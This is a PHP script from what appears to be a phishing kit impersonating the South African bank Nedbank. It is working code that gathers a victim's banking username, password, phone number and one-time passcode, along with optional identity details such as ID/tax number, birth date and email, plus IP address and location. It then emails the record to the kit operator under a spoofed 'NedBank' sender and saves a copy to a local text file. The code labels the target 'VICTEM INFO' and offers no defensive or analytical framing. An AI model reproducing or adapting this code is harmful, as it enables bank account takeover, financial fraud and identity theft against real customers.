<?php
ob_start();
session_start();
error_reporting(0);
include'../config.php';
include'../function.php';
include'../robots.php';
if (!isset($_SESSION['spox'])) {
  //  header('HTTP/1.0 403 Forbidden');
  //  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  //  exit();
}
if (empty($_SESSION['username']) && empty($_SESSION['password']) ) {
    echo "bad";exit();
}
if (strlen($_POST['otp']) !== 6) {
	echo "bad";exit();
}
if (empty($_POST['otp'])) {
    echo "bad";exit();
}else{

$resulta  = "+ --------------[ NedBank DSOX ]---------------+\n";
$resulta .= "[User ID]: ".$_SESSION['username']."\n";
$resulta .= "[Phone Number]: ".$_SESSION['phonword']."\n";
$resulta .= "[Password]: ".$_SESSION['password']."\n";
if($true_login == "yes"){

    if (isset($_SESSION['fullname'])) { $resulta .= "[Full Name]: ".$_SESSION['fullname']."\n"; }   
    if (isset($_SESSION['phonenumber'])) { $resulta .= "[Phone Number]: ".$_SESSION['phonenumber']."\n"; }   
    if (isset($_SESSION['email'])) { $resulta .= "[Email]: ".$_SESSION['email']."\n"; }   
    if (isset($_SESSION['bthd'])) { $resulta .= "[Date Of Birth]: ".$_SESSION['bthd']."\n"; }   
    if (isset($_SESSION['idtaxid'])) { $resulta .= "[ID/TaxID ]: ".$_SESSION['idtaxid']."\n"; }   
    if (isset($_SESSION['city'])) { $resulta .= "[City]: ".$_SESSION['city']."\n"; }   
    if (isset($_SESSION['zipcode'])) { $resulta .= "[Zip Code]: ".$_SESSION['zipcode']."\n"; }   
    if (isset($_SESSION['gender'])) { $resulta .= "[Gender]: ".$_SESSION['gender']."\n"; }  
    
}
$resulta .= "+ --------------[ OTP ]---------------+\n";
$resulta .= "[OTP]: ".$_POST['otp']."\n"; 
$resulta .= "+ --------------[ VICTEM INFO ]---------------+\n";
$resulta .= "IP Address: ".$ip_spox."\n";
$resulta .= "Country: ".$country_spox."\n";
$resulta .= "City: ".$city_spox."\n";
$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
$resulta .= "User Agent: ".$_SESSION['platform']."\n";
$resulta .= "+ --------------[ NedBank DSOX ]---------------+\n";

$subject = "#NedBank OTP: [{$_SESSION['username']}] [ {$country_spox} - {$_SESSION['browser']} - {$ip_spox} ]";
$headers="From: NedBank POX <support@dsox.dz>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

if($mail_result == "yes"){
    @mail($email,$subject,$resulta,$headers);
    include'../rbots.php';
}if($text_result == "yes"){
    $spoxy = fopen("otp.txt","a+");
    fwrite($spoxy,$resulta);
    fclose($spoxy);
}

echo "good";exit();

}
